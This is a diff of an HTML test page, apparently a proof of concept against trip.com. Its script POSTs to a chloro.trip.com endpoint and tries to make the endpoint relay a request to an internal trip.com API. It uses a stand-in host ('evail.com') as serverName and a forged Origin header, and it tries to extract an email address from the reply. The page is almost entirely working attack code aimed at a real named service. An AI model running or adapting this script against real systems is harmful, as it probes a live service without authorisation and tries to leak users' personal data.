@@ -2,41 +2,78 @@
 <html>
 <body>
 
-<h1>CORS Chain Test</h1>
+<h1>CORS Test</h1>
+
 <pre id="result"></pre>
 
 <script>
 
-const result = document.getElementById("result");
+// ===== إرسال الطلب إلى chloro.trip.com =====
+const TARGET_URL = "https://chloro.trip.com/v2/d";
 
-fetch("https://chloro.trip.com/v2/d", {
+// ===== البيانات (body) المرسلة إلى chloro.trip.com =====
+// هذا هو الطلب الذي سيرسله chloro.trip.com إلى trip.com/restapi/...
+const requestBody = new URLSearchParams({
+    data: JSON.stringify({
+        url: "https://www.trip.com/restapi/soa2/24884/json/getConfiguration",
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: {
+            head: {
+                locale: "",
+                currency: "",
+                vID: ""
+            },
+            platform: "Online",
+            componentType: "online-app-download-universal",
+            version: "6.0.5",
+            pageId: "10320668151",
+            aid: 0,
+            sid: 0,
+            customId: "adBanner",
+            customParam: {}
+        }
+    }),
+    version: "11",
+    serverName: "http://evail.com"
+}).toString();
+
+// ===== إرسال الطلب =====
+fetch(TARGET_URL, {
     method: "POST",
-    credentials: "include",
     headers: {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "*/*",
+        "Origin": "https://www.com"
     },
-    body: new URLSearchParams({
-        version: "11",
-        serverName: "anonymous56430.github.io",
-        guid: ""
-    })
+    body: requestBody
 })
 
 .then(async r => {
-    const text = await r.text();
-
-    result.textContent =
-        "Status: " + r.status +
-        "\n\n" +
-        text;
-
-    console.log("Headers:");
-    console.log([...r.headers.entries()]);
-
+    const status = r.status;
+    const responseText = await r.text();
+    
+    document.getElementById("result").textContent = 
+    "Status: " + status + "\n\n" + responseText;
+    
+    // محاولة استخراج الإيميل من الرد
+    try {
+        const jsonResponse = JSON.parse(responseText);
+        if (jsonResponse.email) {
+            document.getElementById("result").textContent += 
+            "\n\n📧 الإيميل: " + jsonResponse.email;
+        }
+        console.log("✅ الرد:", jsonResponse);
+    } catch(e) {
+        console.log("الرد ليس JSON");
+    }
 })
 
-.catch(err => {
-    result.textContent = "ERROR:\n" + err;
+.catch(e => {
+    document.getElementById("result").textContent = 
+    "Blocked:\n" + e;
 });
 
 </script>
